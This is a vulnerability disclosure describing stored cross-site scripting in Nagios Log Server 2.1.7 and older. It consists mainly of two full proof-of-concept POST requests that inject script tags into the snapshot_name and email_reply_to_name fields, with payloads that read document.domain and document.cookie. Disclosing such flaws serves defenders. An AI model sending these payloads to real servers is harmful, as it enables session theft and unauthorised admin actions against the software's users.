# Nagios-Log-Server-2.1.7-Persistent-Cross-Site-Scripting
A stored cross-site scripting (XSS) in [Nagios Log Server 2.1.7](https://www.nagios.com/products/nagios-log-server/) can result in an attacker performing malicious actions to users who open a maliciously crafted link or third-party web page.

[Nagios Log Server 2.1.7](https://www.nagios.com/products/nagios-log-server/) and older versions are affected by these vulnerabilities.


# PoC-1
To exploit vulnerability, someone could use a POST request to '/nagioslogserver/configure/create_snapshot' by manipulating 'snapshot_name' parameter in the request body to impact users who open a maliciously crafted link or third-party web page.

```
POST /nagioslogserver/configure/create_snapshot HTTP/1.1
Host: [TARGET]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
DNT: 1
Connection: close
Cookie: csrf_ls=b3bef5c1a2ef6e4c233282d1c1c229fd; ls_session=883lergotgcjbh9bjgaeakosv5go2gbb; PHPSESSID=nbah0vkmibpudd1qh7qgnpgo53
Upgrade-Insecure-Requests: 1

csrf_ls=b3bef5c1a2ef6e4c233282d1c1c229fd&snapshot_name=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```

![](https://emreovunc.com/blog/en/Nagios_Log_Server_Persistent_XSS.png)

![](https://emreovunc.com/blog/en/Nagios_Log_Server_Persistent_XSS_Request.png)

# PoC-2
To exploit vulnerability, someone could use a POST request to '/nagioslogserver/admin/mail' by manipulating 'email_reply_to_name' parameter in the request body to impact users who open a maliciously crafted link or third-party web page.

```
POST /nagioslogserver/admin/mail HTTP/1.1
Host: [TARGET]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 291
DNT: 1
Connection: close
Cookie: csrf_ls=6e418c757282ab5c4785dad327238158; ls_session=pscogfricmnpe9kpvbtcuccn8mfempgp
Upgrade-Insecure-Requests: 1

csrf_ls=6e418c757282ab5c4785dad327238158&email_from_name=Nagios+Log+Server&email_from=root%40localhost&email_reply_to_name=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&email_reply_to=root%40localhost&email_method=mail&smtp_host=&smtp_crypto=&smtp_port=25&smtp_user=&smtp_pass=
```

![](https://emreovunc.com/blog/en/Nagios_Log_Server_Persistent_XSS-02.png)
